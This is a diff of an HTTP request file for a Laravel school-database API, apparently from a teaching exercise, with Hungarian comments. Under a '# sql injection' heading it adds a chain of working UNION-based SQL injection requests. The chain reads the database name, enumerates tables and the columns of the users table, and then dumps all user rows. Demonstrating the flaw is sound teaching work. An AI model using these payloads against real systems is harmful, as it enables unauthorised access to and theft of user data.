@@ -26,24 +26,25 @@ Accept: application/json
 get {{host}}/api/queryHanyOldalVan/4
 Accept: application/json
 
-### get diak lekérdező by név
+### get diák kereső by név
 get {{host}}/api/queryDiakKeres/Feri
 Accept: application/json
 
-### get adatbázisw neve
-get {{host}}/api/queryDiakKeres/Feri" union select database(), '', '', '', '', '', '', '', '', ''%23"
+# sql injection
+### get mi az adatbázis neve
+get {{host}}/api/queryDiakKeres/Feri" union select database(),  '', '', '', '', '', '', '', ''%23"
 Accept: application/json
 
-### get milyen táblák vannak
-get {{host}}/api/queryDiakKeres/Feri" union SELECT table_name, '', '', '', '', '', '', '', '', '' from information_schema.tables WHERE table_schema = 'laravel-iskola'%23"
+### get milyen táláink vannak
+get {{host}}/api/queryDiakKeres/Feri" union SELECT table_name,  '', '', '', '', '', '', '', '' from information_schema.tables WHERE table_schema = 'laravel-iskola3'%23"
 Accept: application/json
 
-### get milyen oszlopok vannak
-get {{host}}/api/queryDiakKeres/Feri" union SELECT column_name, '', '', '', '', '', '', '', '', '' from information_schema.columns WHERE  table_name='users' AND  table_schema = 'laravel-iskola'%23" 
+### A user tábla oszlopai
+get {{host}}/api/queryDiakKeres/Feri" union SELECT column_name, '', '', '', '', '', '', '', '' from information_schema.columns WHERE  table_name='users' AND  table_schema = 'laravel-iskola3'%23"
 Accept: application/json
 
-### get diak user adatok ritkac
-get {{host}}/api/queryDiakKeres/Feri" union select *, '', '' from users%23"
+### get user adatok
+get {{host}}/api/queryDiakKeres/Feri" union select *, ''from users%23"
 Accept: application/json
 
 # ------------  /lekérdezések ---------
